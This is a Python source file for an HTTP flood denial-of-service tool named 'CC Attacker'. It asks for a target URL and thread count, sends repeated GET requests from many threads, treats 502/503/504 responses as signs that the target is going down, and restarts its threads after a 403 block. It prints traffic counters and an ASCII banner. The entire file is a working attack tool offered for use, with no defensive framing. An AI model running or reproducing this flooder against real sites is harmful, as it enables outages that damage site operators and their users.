import requests
import threading
import os
from time import sleep
from colorama import *
import datetime
just_fix_windows_console()
KILLTSK = "False"

def HTTPERR():
    global a
    global KILLTSK
    KILLTSK = "True"
    print(Fore.RED + "[",datetime.datetime.now(),"]","Main Task: An HTTP Error is recvied,Killing threads..." + Fore.RED)
    print(Fore.RED + "[",datetime.datetime.now(),"]","Main Task: Done,Threads will restart after 30 seconds." + Fore.RED)
    sleep(30)
    KILLTSK = "False"
    print(Fore.GREEN + "[",datetime.datetime.now(),"]","Main Task: Resuming..." + Fore.RED)
    a = 0
    while a<thlim:
    #    if os.name == "nt":
    #        os.system("cls")
    #    else:
    #        os.system("clear")
        if thlim == a:
            break
        a = (a+1)
        x = threading.Thread(target=f, args=(url,sleptm,a))
        x.start()
        #print(Fore.GREEN + "Thread",a,"Started")
    
    yxy = threading.Thread(target=atkcnter)
    yxy.start()
    print(Fore.GREEN + "[",datetime.datetime.now(),"]","Main Task: Done." + Fore.RED)


def f(uri,slptm,thcnt):
    global ATKCNT
    global aa
    global RXSPD
    global RXSPDC
    print(Fore.GREEN + "[",datetime.datetime.now(),"]","Thread",a,":" + "Started" + Fore.RED)
    ATKCNT = 0
    aa = 0
    RXSPDC = 0
    while True:
        RXSPD = requests.get(uri)
        if RXSPD.status_code == 403:
                if KILLTSK == "True":
                    break
                else:
                    HTTPERR()
        if RXSPD.status_code == 502:
            print(Fore.BLUE + "[",datetime.datetime.now(),"]","Main Task: Target host may be down.(502/Bad Gateway)" + Fore.RED)
            sleep(2)
        elif RXSPD.status_code == 503:
            print(Fore.BLUE + "[",datetime.datetime.now(),"]","Main Task: Target host may be down.(503/Service Unavailable)" + Fore.RED)
            sleep(2)
        elif RXSPD.status_code == 504:
            print(Fore.BLUE + "[",datetime.datetime.now(),"]","Main Task: Target host may be down.(504/Gateway Timeout)" + Fore.RED)
            sleep(2)
            
        RXSPDC = RXSPDC+len(RXSPD.text)
        ATKCNT = ATKCNT+1
        sleep(slptm)
        if KILLTSK == "True":
            aa = aa+1
            print(Fore.YELLOW + "[",datetime.datetime.now(),"]","Thread",aa,":" + "Stopping..." + Style.RESET_ALL)
            break
            
def atkcnter():
    global ATKCNT
    global RXSPDC
    print(Fore.GREEN + "[",datetime.datetime.now(),"]","Thread",a+1,"(Counter Loop):" + "Started" + Fore.RED)
    while True:
        sleep(1)
        print(Fore.CYAN + "[",datetime.datetime.now(),"]","Thread",a+1,"(Counter Loop):","TX:",ATKCNT,"Requests Per Second.","RX:",RXSPDC/1000,"KBytes Per Second." + Fore.RED)
        ATKCNT = 0
        RXSPDC = 0
        if KILLTSK == "True":
            print(Fore.YELLOW + "[",datetime.datetime.now(),"]","Thread",a+1,"(Counter Loop):" + "Stopping..." + Style.RESET_ALL)
            break
        
        
        
print(Fore.RED + "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
sleep(0.005)
print(Fore.RED + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.RED + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.RED + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.RED + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.GREEN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.GREEN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.GREEN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.GREEN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.GREEN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.YELLOW + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.YELLOW + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.YELLOW + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.YELLOW + "@@.                                .,/%&@@@@@@(             .,*#&@@@@@@%.               @@")
sleep(0.005)
print(Fore.YELLOW + "@@.                          .#@@@@@&/,&@@@@@@@&       /&@@@@@(,#@@@@@@@@,              @@")
sleep(0.005)
print(Fore.BLUE + "@@.                      .(@@@@@%.    ,@@@@@@@#    *@@@@@&*    .@@@@@@@&,               @@")
sleep(0.005)
print(Fore.BLUE + "@@.                    /@@@@@@,          ..     .&@@@@@/          ...                   @@")
sleep(0.005)
print(Fore.BLUE + "@@.                  (@@@@@&.                 ,@@@@@@/                                  @@")
sleep(0.005)
print(Fore.BLUE + "@@.                 @@@@@@&                  &@@@@@@.                                   @@")
sleep(0.005)
print(Fore.BLUE + "@@.                @@@@@@@                  (@@@@@@/                                    @@")
sleep(0.005)
print(Fore.MAGENTA + "@@.               .@@@@@@@(                 #@@@@@@%                                    @@")
sleep(0.005)
print(Fore.MAGENTA + "@@.                 (@@@@@@@@&%##########.   *@@@@@@@@@%##########,                     @@")
sleep(0.005)
print(Fore.MAGENTA + "@@.                      ,/#%&&&&&&&&%*           ,/#%&&&&&&&&%(.                       @@")
sleep(0.005)
print(Fore.MAGENTA + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.MAGENTA + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.CYAN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.CYAN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.CYAN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.CYAN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.CYAN + "@@.                                                                                     @@")
sleep(0.005)
print(Fore.WHITE + "@@.                                                                                     @@")
sleep(0.005)
print("@@.                                                                                     @@")
sleep(0.005)
print("@@.                                                                                     @@")
sleep(0.005)
print("@@.                                                                                     @@")
sleep(0.005)
print("@@.                                                                                     @@")
sleep(0.005)
print("@@(/////////////////////////////////////////////////////////////////////////////////////@@")
print("CC Attacker by SunnyChon")
print("**Don't attack .gov website!!")
print("\n")
url = input("URL:")
thlim = int(input("Threads:"))
sleptm = int(input("Sleep Time:"))

print(Fore.GREEN + "[",datetime.datetime.now(),"]","Main Task: Spawning threads..." + Fore.RED)
a = 0
while a<thlim:
#    if os.name == "nt":
#        os.system("cls")
#    else:
#        os.system("clear")
    a = (a+1)
    x = threading.Thread(target=f, args=(url,sleptm,a))
    x.start()
    #print(Fore.GREEN + "Thread",a,"Started")
    
yxy = threading.Thread(target=atkcnter)
yxy.start()
print(Fore.GREEN + "[",datetime.datetime.now(),"]","Main Task: Done." + Fore.RED)
print(Fore.GREEN + "[",datetime.datetime.now(),"]","Main Task: To exit,Press ENTER." + Fore.RED)
while True:
    input()
    print(Fore.YELLOW + "[",datetime.datetime.now(),"]","Main Task: Killing All threads..." + Fore.RED)
    KILLTSK = "True"
    print(Fore.YELLOW + "[",datetime.datetime.now(),"]","Main Task: Done." + Fore.RED)
    print(Fore.RED + "[",datetime.datetime.now(),"]","Main Task: Exiting..." + Style.RESET_ALL)
    os._exit(0)